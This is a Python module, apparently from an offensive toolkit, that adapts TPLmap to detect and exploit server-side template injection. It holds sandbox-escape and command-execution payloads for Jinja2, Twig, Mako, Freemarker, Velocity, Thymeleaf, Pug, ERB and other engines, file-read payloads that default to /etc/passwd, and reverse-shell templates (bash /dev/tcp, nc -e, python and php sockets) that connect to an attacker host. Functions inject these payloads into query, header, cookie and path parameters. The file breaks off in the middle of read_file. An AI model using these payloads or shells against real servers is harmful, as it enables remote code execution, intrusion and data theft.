#!/usr/bin/env python3
"""
ZYLON FUSION v5.0 NUCLEAR - TPLmap Engine
==========================================
Fused from: TPLmap (https://github.com/epinna/tplmap)
Purpose: Advanced Server-Side Template Injection detection & exploitation
         Alternative SSTI tool complementing the existing SSTImap engine
Engines: Jinja2, Twig, Mako, Tornado, Freemarker, Velocity, Thymeleaf,
         Pug/Jade, ERB, Dust, Handlebars
Python 3.13 Compatible | Termux Non-Root | No telnetlib
"""

import os
import re
import sys
import time
import base64
import random
import string
import threading
import requests
import urllib3
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.shared_infra import shared_session, regex_cache, PayloadInjector, oob_provider
from core.var import USER_AGENTS

# ============================================================================
# ANSI COLOR CODES
# ============================================================================

R = '\033[91m'    # Red
G = '\033[92m'    # Green
Y = '\033[93m'    # Yellow
C = '\033[96m'    # Cyan
W = '\033[97m'    # White
B = '\033[94m'    # Blue
M = '\033[95m'    # Magenta
BD = '\033[1m'    # Bold
RS = '\033[0m'    # Reset
DIM = '\033[2m'   # Dim

# ============================================================================
# TEMPLATE ENGINE SIGNATURES (TPLmap-style, different from SSTImap)
# ============================================================================

TEMPLATE_ENGINES = {
    'jinja2': {
        'detection_payloads': [
            '{{{{7*7}}}}',
            '{{{{7*7}}}}',
            '{{{{config}}}}',
            '{{{{self.__class__.__mro__}}}}',
            '{{{{request.application.__globals__}}}}',
            '{{{{lipsum.__globals__}}}}',
            '{{{{cycler.__init__.__globals__}}}}',
            '{{{{range.__class__.__bases__}}}}',
        ],
        'fingerprint_strings': ['49', 'Config', '__mro__', '__globals__'],
        'sandbox_escapes': [
            # MRO chain traversal
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            # Builtins via globals
            "{{cycler.__init__.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
            # Lipsum globals
            "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
            # Joiner globals
            "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
            # Namespace globals
            "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
            # URL-for globals
            "{{url_for.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}",
            # Config class chain
            "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
            # Request class chain
            "{{request.__class__.__mro__[1].__subclasses__()[INDEX]}}",
            # Getitem chain
            "{{(config|attr('__class__')).__init__.__globals__['os'].popen('{cmd}').read()}}",
            # Via __builtins__ dict access
            "{{x.__init__.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}",
        ],
        'rce_payloads': [
            "{{cycler.__init__.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
            "{{lipsum.__globals__['os'].popen('{cmd}').read()}}",
            "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
            "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
        ],
        'file_read_payloads': [
            "{{cycler.__init__.__globals__.__builtins__.__import__('os').popen('cat {filepath}').read()}}",
            "{{lipsum.__globals__['os'].popen('cat {filepath}').read()}}",
        ],
        'reverse_shell_payloads': [
            "{{cycler.__init__.__globals__.__builtins__.__import__('os').popen('{shell_cmd}').read()}}",
            "{{lipsum.__globals__['os'].popen('{shell_cmd}').read()}}",
        ],
        'error_patterns': [r'jinja2', r'UndefinedError', r'TemplateSyntaxError', r'TemplateAssertionError'],
    },
    'twig': {
        'detection_payloads': [
            '{{{{7*7}}}}',
            '{{{{_self.env.registerUndefinedFilterCallback("exec")}}}}',
            '{{{{_self.env.getFilter("id")}}}}',
            '{{{{["id"]|map("system")|join}}}}',
            '{{{{{"s0"}|nl2br}}}}',
            '{{{{dump(app)}}}}',
            '{{{{app.request.server.all}}}}',
        ],
        'fingerprint_strings': ['49', '_self', 'exec', 'system'],
        'sandbox_escapes': [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("{cmd}")}}',
            '{{["{cmd_b64}"]|map("base64_decode")|map("system")|join}}',
            '{{["{cmd}"]|map("system")|join}}',
            '{%set cmd="{cmd}"%}{{cmd|system}}',
            '{{[0]|reduce("system","{cmd}")}}',
        ],
        'rce_payloads': [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("{cmd}")}}',
            '{{["{cmd_b64}"]|map("base64_decode")|map("system")|join}}',
        ],
        'file_read_payloads': [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat {filepath}")}}',
        ],
        'reverse_shell_payloads': [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("{shell_cmd}")}}',
        ],
        'error_patterns': [r'Twig', r'Twig_Error', r'twig/template', r'Twig\SyntaxError'],
    },
    'mako': {
        'detection_payloads': [
            '${7*7}',
            '${"".join("ab")}',
            '<% 7*7 %>',
            '${self.module.__builtins__}',
            '<%import os%>',
        ],
        'fingerprint_strings': ['49', '__builtins__', 'module'],
        'sandbox_escapes': [
            '${__import__("os").popen("{cmd}").read()}',
            '${eval("__import__(\\"os\\").popen(\\"{cmd}\\").read()")}',
            '<%import os%>${os.popen("{cmd}").read()}',
            '<%\nimport os\nos.system("{cmd}")\n%>',
        ],
        'rce_payloads': [
            '${__import__("os").popen("{cmd}").read()}',
            '<%import os%>${os.popen("{cmd}").read()}',
        ],
        'file_read_payloads': [
            '${__import__("os").popen("cat {filepath}").read()}',
        ],
        'reverse_shell_payloads': [
            '${__import__("os").popen("{shell_cmd}").read()}',
        ],
        'error_patterns': [r'Mako', r'mako\.exceptions', r'template\.runtime'],
    },
    'tornado': {
        'detection_payloads': [
            '{{{{7*7}}}}',
            '{{{{config}}}}',
            '{{{{handler.settings}}}}',
            '{{{{handler.application.settings}}}}',
            '{{{{request}}}}',
        ],
        'fingerprint_strings': ['49', 'config', 'handler', 'settings'],
        'sandbox_escapes': [
            '{{handler.application.settings["{cmd}"]}}',
            '{%import os%}{{os.popen("{cmd}").read()}}',
            '{{__import__("os").popen("{cmd}").read()}}',
        ],
        'rce_payloads': [
            '{%import os%}{{os.popen("{cmd}").read()}}',
        ],
        'file_read_payloads': [
            '{%import os%}{{os.popen("cat {filepath}").read()}}',
        ],
        'reverse_shell_payloads': [
            '{%import os%}{{os.popen("{shell_cmd}").read()}}',
        ],
        'error_patterns': [r'Tornado', r'tornado\.template', r'template\.runtime'],
    },
    'freemarker': {
        'detection_payloads': [
            '${7*7}',
            '<#if 1==1>ssti</#if>',
            '${"freemarker.template.utility.Execute"?new()("id")}',
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '${.now}',
        ],
        'fingerprint_strings': ['49', 'ssti', 'freemarker', 'Execute'],
        'sandbox_escapes': [
            '${"freemarker.template.utility.Execute"?new()("{cmd}")}',
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{cmd}")}',
            '<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","{cmd}").start()}',
            '${"freemarker.template.utility.Execute"?new()("{cmd}")}',
        ],
        'rce_payloads': [
            '${"freemarker.template.utility.Execute"?new()("{cmd}")}',
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("{cmd}")}',
        ],
        'file_read_payloads': [
            '<#assign is=object?api.getClass().getResourceAsStream("/{filepath}")><#assign br=new java.io.BufferedReader(new java.io.InputStreamReader(is))><#list 1..1000 as _><#assign line=br.readLine()!""/>${line}</#list>',
        ],
        'reverse_shell_payloads': [
            '${"freemarker.template.utility.Execute"?new()("{shell_cmd}")}',
        ],
        'error_patterns': [r'FreeMarker', r'freemarker\.core', r'freemarker\.log'],
    },
    'velocity': {
        'detection_payloads': [
            '#set($e=7*7)$e',
            '${7*7}',
            '#set($c=7*7)$c',
            '$class.inspect("java.lang.Runtime").type',
            '#set($x="")$x.class.forName("java.lang.Runtime")',
        ],
        'fingerprint_strings': ['49', 'Runtime', 'inspect'],
        'sandbox_escapes': [
            '#set($r=$Class.forName("java.lang.Runtime").getRuntime().exec("{cmd}"))',
            '#set($s=$Class.forName("java.lang.Runtime").getRuntime().exec("{cmd}"))$s',
            '#set($e="e")$e.getClass().forName("java.lang.Runtime").getRuntime().exec("{cmd}")',
            '#set($x=$Class.forName("java.lang.ProcessBuilder").getConstructor(["java.lang.String[]"]).newInstance(["{cmd}"]).start())',
        ],
        'rce_payloads': [
            '#set($r=$Class.forName("java.lang.Runtime").getRuntime().exec("{cmd}"))',
        ],
        'file_read_payloads': [
            '#set($s=$Class.forName("java.util.Scanner").getConstructor($Class.forName("java.io.File")).newInstance($Class.forName("java.io.File").new("{filepath}")))$s.useDelimiter("\\Z").next()',
        ],
        'reverse_shell_payloads': [
            '#set($r=$Class.forName("java.lang.Runtime").getRuntime().exec("{shell_cmd}"))',
        ],
        'error_patterns': [r'Velocity', r'VelocityView', r'org\.apache\.velocity'],
    },
    'thymeleaf': {
        'detection_payloads': [
            '[[${7*7}]]',
            '${7*7}',
            '[[${T(java.lang.Runtime).getRuntime().exec("id")}]]',
            '__${7*7}__',
            '${T(java.lang.Math).random()}',
        ],
        'fingerprint_strings': ['49', 'Runtime', 'Math'],
        'sandbox_escapes': [
            '[[${T(java.lang.Runtime).getRuntime().exec("{cmd}")}]]',
            '${T(java.lang.Runtime).getRuntime().exec("{cmd}")}',
            '[[${new java.lang.ProcessBuilder({"{cmd}"}).start()}]]',
        ],
        'rce_payloads': [
            '[[${T(java.lang.Runtime).getRuntime().exec("{cmd}")}]]',
            '${T(java.lang.Runtime).getRuntime().exec("{cmd}")}',
        ],
        'file_read_payloads': [
            '[[${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get("{filepath}"))}]]',
        ],
        'reverse_shell_payloads': [
            '[[${T(java.lang.Runtime).getRuntime().exec("{shell_cmd}")}]]',
        ],
        'error_patterns': [r'Thymeleaf', r'thymeleaf', r'org\.thymeleaf'],
    },
    'pug': {
        'detection_payloads': [
            '#{7*7}',
            '| #{7*7}',
            '-var x = 7*7\n=x',
            '#{function(){return 7*7}()}',
        ],
        'fingerprint_strings': ['49'],
        'sandbox_escapes': [
            '-global.process.mainModule.require("child_process").execSync("{cmd}").toString()',
            '-require("child_process").execSync("{cmd}").toString()',
            '#{function(){return global.process.mainModule.require("child_process").execSync("{cmd}").toString()}()}',
        ],
        'rce_payloads': [
            '-global.process.mainModule.require("child_process").execSync("{cmd}").toString()',
            '-require("child_process").execSync("{cmd}").toString()',
        ],
        'file_read_payloads': [
            '-require("fs").readFileSync("{filepath}","utf8")',
        ],
        'reverse_shell_payloads': [
            '-require("child_process").execSync("{shell_cmd}").toString()',
        ],
        'error_patterns': [r'Pug', r'pug', r'Jade'],
    },
    'erb': {
        'detection_payloads': [
            '<%= 7*7 %>',
            '<%= system("id") %>',
            '<%= `id` %>',
            '<%= exec("id") %>',
            '<%= open("|id") %>',
        ],
        'fingerprint_strings': ['49', 'uid=', 'root'],
        'sandbox_escapes': [
            '<%= system("{cmd}") %>',
            '<%= `{cmd}` %>',
            '<%= exec("{cmd}") %>',
            '<%= open("|{cmd}") %>',
            '<%= IO.popen("{cmd}").read() %>',
        ],
        'rce_payloads': [
            '<%= system("{cmd}") %>',
            '<%= `{cmd}` %>',
            '<%= IO.popen("{cmd}").read() %>',
        ],
        'file_read_payloads': [
            '<%= File.read("{filepath}") %>',
            '<%= IO.read("{filepath}") %>',
        ],
        'reverse_shell_payloads': [
            '<%= system("{shell_cmd}") %>',
            '<%= IO.popen("{shell_cmd}").read() %>',
        ],
        'error_patterns': [r'ERB', r'ActionView', r'erb\.html'],
    },
    'dust': {
        'detection_payloads': [
            '{7*7}',
            '{@math key="7" method="multiply" operand="7"/}',
            '{?test}true{:else}false{/test}',
        ],
        'fingerprint_strings': ['49', 'true'],
        'sandbox_escapes': [
            '{@math key="7" method="multiply" operand="7"/}',
        ],
        'rce_payloads': [],
        'file_read_payloads': [],
        'reverse_shell_payloads': [],
        'error_patterns': [r'Dust', r'dust', r'dust\.js'],
    },
    'handlebars': {
        'detection_payloads': [
            '{{7*7}}',
            '{{{{7*7}}}}',
            '{{#with this}}{{/with}}',
            '{{#each this}}{{/each}}',
        ],
        'fingerprint_strings': ['49'],
        'sandbox_escapes': [
            '{{#with "s" as |s|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup this.__proto__ "env")}}{{#each conslist}}{{#with (string.sub this 1)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}',
        ],
        'rce_payloads': [],
        'file_read_payloads': [],
        'reverse_shell_payloads': [],
        'error_patterns': [r'Handlebars', r'Mustache', r'handlebars'],
    },
}

# ============================================================================
# BLIND SSTI DETECTION PAYLOADS
# ============================================================================

BLIND_SSTI_TIME_PAYLOADS = {
    'jinja2': [
        '{{{{config.__class__.__init__.__globals__["os"].popen("sleep {delay}").read()}}}}',
        '{{{{cycler.__init__.__globals__.os.popen("sleep {delay}").read()}}}}',
    ],
    'twig': [
        '{{{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("sleep {delay}")}}}}',
    ],
    'mako': [
        '${__import__("os").popen("sleep {delay}").read()}',
        '${__import__("time").sleep({delay})}',
    ],
    'erb': [
        '<%= sleep({delay}) %>',
        '<%= system("sleep {delay}") %>',
    ],
    'freemarker': [
        '${"freemarker.template.utility.Execute"?new()("sleep {delay}")}',
    ],
    'generic': [
        '{{{{7*7}}}}',  # Fallback - check response diff
    ],
}

BLIND_SSTI_BOOLEAN_PAYLOADS = {
    'jinja2': [
        ('{{{{7*7}}}}', '49'),  # True: contains 49
        ('{{{{7*0}}}}', '0'),   # False: contains 0
    ],
    'twig': [
        ('{{{{7*7}}}}', '49'),
        ('{{{{7*0}}}}', '0'),
    ],
    'mako': [
        ('${7*7}', '49'),
        ('${7*0}', '0'),
    ],
    'generic': [
        ('{{{{7*7}}}}', '49'),
        ('${7*7}', '49'),
    ],
}

# ============================================================================
# REVERSE SHELL TEMPLATES
# ============================================================================

REVERSE_SHELL_TEMPLATES = {
    'bash': 'bash -i >& /dev/tcp/{host}/{port} 0>&1',
    'python': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
    'python_short': 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
    'nc': 'nc -e /bin/bash {host} {port}',
    'nc_mkfifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f',
    'php': 'php -r \'$s=fsockopen("{host}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
}


# ============================================================================
# TPLmap ENGINE
# ============================================================================

class TPLmapEngine:
    """
    TPLmap Engine - Advanced SSTI Detection & Exploitation
    Fused from: https://github.com/epinna/tplmap
    Complements existing SSTImap engine with alternative payloads and techniques.
    """

    def __init__(self, session=None, timeout=10, retries=2, threads=5,
                 delay=0, verbose=True, proxy=None):
        self.session = session or shared_session
        self.timeout = timeout
        self.retries = retries
        self.threads = threads
        self.delay = delay
        self.verbose = verbose
        self.findings = []
        self.detected_engine = None
        self.injectable_param = None
        self._baseline = None
        self._baseline_length = 0
        self._baseline_status = 0
        self._baseline_time = 0

    def _log(self, msg, level="info"):
        """Print colored log message"""
        colors = {
            "info": C, "success": G, "warning": Y,
            "error": R, "critical": R, "payload": M
        }
        color = colors.get(level, W)
        prefix = {
            "info": "*", "success": "+", "warning": "!",
            "error": "-", "critical": "!!!", "payload": ">"
        }.get(level, "*")
        if self.verbose:
            print(f"  {color}[{prefix}]{RS} {msg}")

    def _make_request(self, url, method='GET', params=None, data=None,
                      headers=None, cookies=None):
        """Make HTTP request with retry logic"""
        for attempt in range(self.retries):
            try:
                resp = self.session.request(
                    method=method, url=url, params=params, data=data,
                    headers=headers, cookies=cookies, timeout=self.timeout,
                    verify=False, allow_redirects=True
                )
                if self.delay > 0:
                    time.sleep(self.delay)
                return resp
            except requests.exceptions.Timeout:
                self._log(f"Timeout (attempt {attempt+1}/{self.retries})", "warning")
            except requests.exceptions.ConnectionError:
                self._log(f"Connection error (attempt {attempt+1}/{self.retries})", "warning")
                time.sleep(1)
            except requests.RequestException:
                return None
        return None

    def _get_injection_points(self, url, param=None):
        """Get all injection points from URL and parameters"""
        points = []
        parsed = urlparse(url)

        # URL query parameters
        qs_params = parse_qs(parsed.query)
        for p, values in qs_params.items():
            points.append((p, values[0] if values else '', 'query'))

        # Explicit param
        if param:
            points.append((param, 'test', 'query'))

        # Default param if none found
        if not points:
            points.append(('q', 'test', 'query'))
            points.append(('name', 'test', 'query'))
            points.append(('input', 'test', 'query'))

        return points

    def _inject_payload(self, url, param_name, payload, inject_type='query'):
        """Inject payload into specific parameter"""
        if inject_type == 'query':
            return self._make_request(url, 'GET', params={param_name: payload})
        elif inject_type == 'post':
            return self._make_request(url, 'POST', data={param_name: payload})
        elif inject_type == 'json':
            injection = PayloadInjector.inject_json(url, param_name, payload)
            return self._make_request(injection['url'], injection['method'],
                                     json=injection['json'],
                                     headers=injection.get('headers', {}))
        elif inject_type == 'header':
            return self._make_request(url, 'GET', headers={param_name: payload})
        elif inject_type == 'cookie':
            return self._make_request(url, 'GET', cookies={param_name: payload})
        elif inject_type == 'path':
            base_url = url.rsplit('/', 1)[0]
            return self._make_request(f"{base_url}/{payload}", 'GET')
        return None

    def _get_baseline(self, url, param=None):
        """Get baseline response for comparison"""
        points = self._get_injection_points(url, param)
        if points:
            p_name, p_val, _ = points[0]
            resp = self._inject_payload(url, p_name, 'zylon_benign_test_12345', 'query')
        else:
            resp = self._make_request(url)
        if resp:
            self._baseline = resp.text
            self._baseline_length = len(resp.text)
            self._baseline_status = resp.status_code
            self._baseline_time = resp.elapsed.total_seconds()
        return resp

    # ========================================================================
    # detect_ssti
    # ========================================================================

    def detect_ssti(self, url, param=None):
        """
        Detect SSTI with multiple techniques.
        Tests all template engines with detection payloads.
        """
        self._log(f"Starting SSTI detection on {url}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'engine': None,
                'param': None,
                'injection_type': None,
                'detection_method': None,
            },
            'scan_type': 'ssti_detect',
        }

        # Get baseline
        self._log("Acquiring baseline response...", "info")
        self._get_baseline(url, param)
        if not self._baseline:
            results['details']['error'] = 'Could not get baseline response'
            return results

        # Test injection points
        injection_points = self._get_injection_points(url, param)
        self._log(f"Testing {len(injection_points)} injection point(s)...", "info")

        for p_name, p_val, inject_type in injection_points:
            for engine_name, engine_data in TEMPLATE_ENGINES.items():
                for payload in engine_data['detection_payloads']:
                    resp = self._inject_payload(url, p_name, payload, inject_type)
                    if not resp:
                        continue

                    # Check for arithmetic evaluation (7*7=49)
                    if '49' in resp.text and '49' not in self._baseline:
                        results['vulnerable'] = True
                        results['findings'].append({
                            'type': 'ssti_detected',
                            'engine': engine_name,
                            'param': p_name,
                            'injection_type': inject_type,
                            'payload': payload,
                            'evidence': 'Arithmetic evaluation (7*7=49)',
                            'response_length': len(resp.text),
                            'baseline_length': self._baseline_length,
                        })
                        results['details']['engine'] = engine_name
                        results['details']['param'] = p_name
                        results['details']['injection_type'] = inject_type
                        results['details']['detection_method'] = 'arithmetic_eval'
                        self.detected_engine = engine_name
                        self.injectable_param = p_name
                        self._log(f"SSTI detected! Engine: {engine_name}, Param: {p_name}", "success")
                        return results

                    # Check for significant response difference
                    if abs(len(resp.text) - self._baseline_length) > 200:
                        engine_from_error = self._detect_engine_from_error(resp.text)
                        if engine_from_error:
                            results['vulnerable'] = True
                            results['findings'].append({
                                'type': 'ssti_detected',
                                'engine': engine_from_error,
                                'param': p_name,
                                'injection_type': inject_type,
                                'payload': payload,
                                'evidence': f'Error reveals {engine_from_error} template engine',
                                'response_length': len(resp.text),
                                'baseline_length': self._baseline_length,
                            })
                            results['details']['engine'] = engine_from_error
                            results['details']['param'] = p_name
                            results['details']['injection_type'] = inject_type
                            results['details']['detection_method'] = 'error_disclosure'
                            self.detected_engine = engine_from_error
                            self.injectable_param = p_name
                            self._log(f"SSTI detected via error! Engine: {engine_from_error}", "success")
                            return results

                    # Check for engine fingerprint strings
                    for fp in engine_data['fingerprint_strings']:
                        if fp in resp.text and fp not in self._baseline:
                            # Additional check: response significantly different
                            if len(resp.text) != self._baseline_length:
                                results['vulnerable'] = True
                                results['findings'].append({
                                    'type': 'ssti_detected',
                                    'engine': engine_name,
                                    'param': p_name,
                                    'injection_type': inject_type,
                                    'payload': payload,
                                    'evidence': f'Fingerprint string "{fp}" found in response',
                                    'response_length': len(resp.text),
                                    'baseline_length': self._baseline_length,
                                })
                                results['details']['engine'] = engine_name
                                results['details']['param'] = p_name
                                results['details']['injection_type'] = inject_type
                                results['details']['detection_method'] = 'fingerprint'
                                self.detected_engine = engine_name
                                self.injectable_param = p_name
                                self._log(f"SSTI detected via fingerprint! Engine: {engine_name}", "success")
                                return results

                if self.detected_engine:
                    break
            if self.detected_engine:
                break

        # If no engine detected with specific payloads, try generic
        if not results['vulnerable']:
            results = self._generic_detect(url, param, injection_points, results)

        if results['vulnerable']:
            self._log(f"{G}SSTI CONFIRMED! Engine: {results['details']['engine']}{RS}", "success")
        else:
            self._log("No SSTI vulnerability detected", "warning")

        return results

    def _generic_detect(self, url, param, injection_points, results):
        """Generic SSTI detection using polyglots"""
        polyglots = [
            '${7*7}', '{{7*7}}', '<%= 7*7 %>', '#{7*7}',
            '{{=7*7}}', '*{7*7}', '${7*7}', '#{7*7}',
            '{{7*"7"}}', '${7*"7"}',
        ]

        for p_name, p_val, inject_type in injection_points:
            for payload in polyglots:
                resp = self._inject_payload(url, p_name, payload, inject_type)
                if not resp:
                    continue

                if '49' in resp.text and '49' not in self._baseline:
                    results['vulnerable'] = True
                    results['findings'].append({
                        'type': 'ssti_detected',
                        'engine': 'generic (unidentified)',
                        'param': p_name,
                        'injection_type': inject_type,
                        'payload': payload,
                        'evidence': 'Arithmetic evaluation (7*7=49)',
                    })
                    results['details']['engine'] = 'generic'
                    results['details']['param'] = p_name
                    results['details']['detection_method'] = 'generic_arithmetic'
                    self.detected_engine = 'generic'
                    self.injectable_param = p_name
                    return results

                if '7777777' in resp.text and '7777777' not in self._baseline:
                    results['vulnerable'] = True
                    results['findings'].append({
                        'type': 'ssti_detected',
                        'engine': 'generic (string mult)',
                        'param': p_name,
                        'injection_type': inject_type,
                        'payload': payload,
                        'evidence': 'String multiplication (7*"7"=7777777)',
                    })
                    results['details']['engine'] = 'generic'
                    results['details']['param'] = p_name
                    results['details']['detection_method'] = 'generic_string_mult'
                    self.detected_engine = 'generic'
                    self.injectable_param = p_name
                    return results

        return results

    def _detect_engine_from_error(self, text):
        """Detect template engine from error messages"""
        for engine_name, engine_data in TEMPLATE_ENGINES.items():
            for pattern in engine_data.get('error_patterns', []):
                if regex_cache.search(pattern, text, re.IGNORECASE):
                    return engine_name

        return None

    # ========================================================================
    # identify_engine
    # ========================================================================

    def identify_engine(self, url, param=None):
        """
        Identify the template engine being used.
        More thorough than detection - tests each engine specifically.
        """
        self._log(f"Identifying template engine on {url}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'engine': None,
                'confidence': None,
                'engine_scores': {},
            },
            'scan_type': 'ssti_identify',
        }

        # Get baseline
        self._get_baseline(url, param)

        injection_points = self._get_injection_points(url, param)
        engine_scores = {}

        for p_name, p_val, inject_type in injection_points:
            for engine_name, engine_data in TEMPLATE_ENGINES.items():
                score = 0
                evidence = []

                for payload in engine_data['detection_payloads']:
                    resp = self._inject_payload(url, p_name, payload, inject_type)
                    if not resp:
                        continue

                    # Check for 49
                    if '49' in resp.text and '49' not in (self._baseline or ''):
                        score += 10
                        evidence.append(f'Arithmetic eval: {payload}')

                    # Check for response diff
                    if abs(len(resp.text) - self._baseline_length) > 100:
                        score += 3
                        evidence.append(f'Response diff with: {payload}')

                    # Check for error patterns
                    for pattern in engine_data.get('error_patterns', []):
                        if regex_cache.search(pattern, resp.text, re.IGNORECASE):
                            score += 15
                            evidence.append(f'Error pattern match: {pattern}')

                    # Check for fingerprint strings
                    for fp in engine_data['fingerprint_strings']:
                        if fp in resp.text and fp not in (self._baseline or ''):
                            score += 5
                            evidence.append(f'Fingerprint found: {fp}')

                if score > 0:
                    engine_scores[engine_name] = {
                        'score': score,
                        'evidence': evidence,
                        'param': p_name,
                    }

        results['details']['engine_scores'] = engine_scores

        # Determine best match
        if engine_scores:
            best_engine = max(engine_scores.items(), key=lambda x: x[1]['score'])
            engine_name = best_engine[0]
            score = best_engine[1]['score']

            results['details']['engine'] = engine_name
            results['details']['confidence'] = 'high' if score >= 20 else 'medium' if score >= 10 else 'low'
            results['vulnerable'] = score >= 10

            if results['vulnerable']:
                self.detected_engine = engine_name
                self.injectable_param = best_engine[1]['param']
                results['findings'].append({
                    'type': 'engine_identified',
                    'engine': engine_name,
                    'score': score,
                    'confidence': results['details']['confidence'],
                    'evidence': best_engine[1]['evidence'][:5],
                    'param': best_engine[1]['param'],
                })
                self._log(f"Engine identified: {engine_name} (score: {score}, confidence: {results['details']['confidence']})", "success")

        return results

    # ========================================================================
    # sandbox_escape
    # ========================================================================

    def sandbox_escape(self, url, param=None, engine=None):
        """
        Attempt sandbox escape for identified engine.
        Tries multiple escape techniques per engine.
        """
        engine = engine or self.detected_engine
        if not engine:
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'No engine specified'}, 'scan_type': 'ssti_sandbox_escape'}

        if engine not in TEMPLATE_ENGINES:
            return {'vulnerable': False, 'findings': [], 'details': {'error': f'Unknown engine: {engine}'}, 'scan_type': 'ssti_sandbox_escape'}

        self._log(f"Attempting sandbox escape for {engine}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'engine': engine,
                'escapes_tested': 0,
                'escapes_successful': [],
            },
            'scan_type': 'ssti_sandbox_escape',
        }

        escapes = TEMPLATE_ENGINES[engine].get('sandbox_escapes', [])
        param_name = param or self.injectable_param or 'q'
        results['details']['escapes_tested'] = len(escapes)

        for i, escape_payload in enumerate(escapes):
            test_cmd = 'echo ZYLON_SSTI_TEST'
            try:
                payload = escape_payload.format(cmd=test_cmd, cmd_b64=base64.b64encode(test_cmd.encode()).decode())
            except (KeyError, IndexError):
                payload = escape_payload

            resp = self._inject_payload(url, param_name, payload, 'query')
            if not resp:
                continue

            # Check if our test string appears in response
            if 'ZYLON_SSTI_TEST' in resp.text:
                results['vulnerable'] = True
                results['findings'].append({
                    'type': 'sandbox_escape',
                    'engine': engine,
                    'payload': escape_payload[:100],
                    'evidence': 'Test string echoed back - sandbox escaped',
                    'param': param_name,
                })
                results['details']['escapes_successful'].append(i)
                self._log(f"Sandbox escape successful with payload #{i+1}!", "success")
                break

            # Check for significant response difference (blind escape)
            if abs(len(resp.text) - self._baseline_length) > 200:
                results['findings'].append({
                    'type': 'possible_sandbox_escape',
                    'engine': engine,
                    'payload': escape_payload[:100],
                    'evidence': f'Response changed significantly ({self._baseline_length} -> {len(resp.text)})',
                    'param': param_name,
                })

        if results['vulnerable']:
            self._log(f"{G}SANDBOX ESCAPED! {len(results['details']['escapes_successful'])} technique(s) work{RS}", "success")
        else:
            self._log("Sandbox escape not confirmed (blind RCE may still work)", "warning")

        return results

    # ========================================================================
    # execute_code
    # ========================================================================

    def execute_code(self, url, param=None, code='id', engine=None):
        """
        Execute code via SSTI.
        """
        engine = engine or self.detected_engine
        if not engine:
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'No engine specified'}, 'scan_type': 'ssti_exec_code'}

        if engine not in TEMPLATE_ENGINES:
            return {'vulnerable': False, 'findings': [], 'details': {'error': f'Unknown engine: {engine}'}, 'scan_type': 'ssti_exec_code'}

        self._log(f"Executing code via {engine} SSTI: {code}", "info")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'engine': engine,
                'command': code,
                'output': None,
            },
            'scan_type': 'ssti_exec_code',
        }

        rce_payloads = TEMPLATE_ENGINES[engine].get('rce_payloads', [])
        param_name = param or self.injectable_param or 'q'

        for payload_template in rce_payloads:
            try:
                cmd_b64 = base64.b64encode(code.encode()).decode()
                payload = payload_template.format(cmd=code, cmd_b64=cmd_b64)
            except (KeyError, IndexError):
                payload = payload_template

            resp = self._inject_payload(url, param_name, payload, 'query')
            if not resp:
                continue

            # Try to extract output
            output = self._extract_command_output(resp.text, code)
            if output:
                results['vulnerable'] = True
                results['findings'].append({
                    'type': 'code_execution',
                    'engine': engine,
                    'command': code,
                    'payload': payload[:120],
                    'output': output[:500],
                    'param': param_name,
                })
                results['details']['output'] = output[:500]
                self._log(f"Code execution successful! Output: {output[:100]}", "success")
                return results

            # Check for blind RCE
            if abs(len(resp.text) - self._baseline_length) > 100:
                results['findings'].append({
                    'type': 'possible_blind_rce',
                    'engine': engine,
                    'command': code,
                    'payload': payload[:120],
                    'evidence': f'Response diff: {self._baseline_length} -> {len(resp.text)}',
                    'param': param_name,
                })

        if results['findings'] and not results['vulnerable']:
            results['vulnerable'] = True
            results['details']['output'] = 'Blind RCE - no visible output but response changed'

        return results

    # ========================================================================
    # read_file
    # ========================================================================

    def read_file(self, url, param=None, file_path='/etc/passwd', engine=None):
        """
        Read files via SSTI.
        """
        engine = engine or self.detected_engine
        if not engine:
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'No engine specified'}, 'scan_type': 'ssti_file_read'}

        if engine not in TEMPLATE_ENGINES:
